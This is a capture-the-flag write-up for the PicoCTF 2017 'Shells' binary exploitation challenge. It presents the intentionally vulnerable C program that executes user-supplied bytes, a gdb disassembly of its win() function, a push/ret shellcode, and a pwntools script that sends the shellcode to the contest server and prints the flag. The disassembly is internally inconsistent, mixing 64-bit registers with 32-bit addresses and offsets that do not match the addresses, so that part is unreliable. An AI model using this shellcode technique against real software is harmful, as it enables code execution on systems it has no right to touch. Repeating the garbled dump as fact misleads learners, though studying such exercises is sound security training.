# Shells

PicoCTF - Disclaimer("This is from kamakwazee's write up https://github.com/djinn00/write-ups/blob/master/PicoCTF2017/exploitation/shells.md")

Desc : "This is a binary exploitation challenge worth 70 points"

Okay so we found a source code :
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 10

//TODO: Ask IT why this is here
void win(){
    system("/bin/cat ./flag.txt");    
}


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();      
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}
```
From the program above, we can see that there is a function called "win" to print the flag. Lets try runing the program :
```
blaccmail@localhost:~/Downloads$ ./shells.exe
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
1   
Segmentation fault
-------------------------------------------------------------
blaccmail@localhost:~/Downloads$ ./shells.exe
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
AAAAAA
Segmentation fault
```

The program ask you to put a 10 byte input, but when you do that it segfault. You can see at the "vuln()" the program using mmap function and the PROT parameters are set into ```PROT_EXEC|PROT_READ|PROT_WRITE``` wich means the program can execute any instruction from the input variable. Now lets disass the program :
```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x08048540 <+0>:	push   rbp
   0x08048541 <+1>:	mov    rbp,rsp
   0x08048543 <+4>:	lea    rdi,[rip+0x1a3]       
   0x08048546 <+11>:	call   0x08048700 <system@plt>
   0x08048549 <+16>:	nop
   0x08048556 <+17>:	pop    rbp
   0x08048557 <+18>:	ret    
End of assembler dump.
```
What we want to do is to create a command so the win() address will pushed on top of the stack and then the program can return to it.
```
-------------------------------
push	0x08048540
ret
-------------------------------
\x68\x40\x85\x04\x08\xc3  <- Instruction in hex.
-------------------------------
```
Now lets craft teh pawload on python.
```
from pwn import *

p = remote('shell2017.picoctf.com', 17533)

sc = '\x68\x40\x85\x04\x08\xc3'
p.recvuntil(':\n')
p.send(sc)
flag = p.recvline()
print flag

p.close()
```
Let see here :
```
blaccmail@localhost:~/Downloads$ python test.py
[+] Opening connection to shell2017.picoctf.com on port 17533: Done
4350d27b024f8597f10b98f164f0fc43

[*] Closed connection to shell2017.picoctf.com port 17533
blaccmail@localhost:~/Downloads$ 
```

Great! and the flag is found!

# Flag [4350d27b024f8597f10b98f164f0fc43]





